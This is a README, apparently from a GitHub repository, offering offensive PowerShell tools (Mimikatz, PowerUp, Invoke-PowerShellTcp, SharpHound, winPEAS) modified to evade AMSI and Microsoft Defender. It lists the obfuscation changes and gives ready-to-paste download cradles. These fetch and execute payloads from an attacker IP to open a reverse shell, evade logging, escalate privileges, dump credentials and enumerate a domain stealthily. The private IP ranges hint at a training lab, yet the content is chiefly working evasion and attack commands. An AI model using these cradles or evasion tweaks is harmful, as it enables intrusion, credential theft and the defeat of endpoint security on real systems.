
<h1 align="center">
<br>
<img src=ihateamsi.jpg height="310" border="2px solid #555">
<br>
i hate AMSI
</h1>
<h4 align="center">
disabling RTM is for noobs
</h4>

## bypasses

These are all just for MDE. Anything serious and you're on your own

- `Invoke-Mimimkatz` **[NOT WORKING YET]**
    - The source VS solution had to be edited manually as the reflective assembly blob is signatured pretty hard. After compiling you can use that update script online (google it) and update the blob.
    - Had to add some base64-strings and change a parameter on PowerShell script. `DumpCreds` is now `GetPwned`.

- `PowerUp.ps1`
    - Removed service binaries. Hijack it yourself!
    - HTML reports removed.

- `Invoke-PowerShellTcp`
    - Removed some comments and error messages.

- `InvisiShell`
    - No changes.

- `SharpHound.ps1`
    - Had to obfuscate a reflection string.

- `winPEAS.bat`
    - Obfuscated color line string variable (terrible signature.)

## to-be-added

- `SessionHunter`
- `PowerView`
- `Rubeus`

## download cradles

These only work on PowerShell 3.0. Don't downgrade to 2.0 you will get caught

- **Reverse Shell**
```
iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
```

- **Log Evasion**
```
iwr http://172.16.100.X/InvisiShellProfiler.dll -UseBasicParsing -OutFile InvisiShellProfiler.dll;
iex (iwr http://172.16.100.X/RunWithRegistryNonAdmin.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/RunWithPathAsAdmin.bat -UseBasicParsing);
```

- **Privilege Escalation**
```
iex (iwr http://172.16.100.X/winPEAS-OBFS.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
```

- **Dump Creds**
```
iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -GetPwned;
```

- **Domain Abuse**

SHARPHOUND TOUCHES DISK OBVIOUSLY

```
iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
```
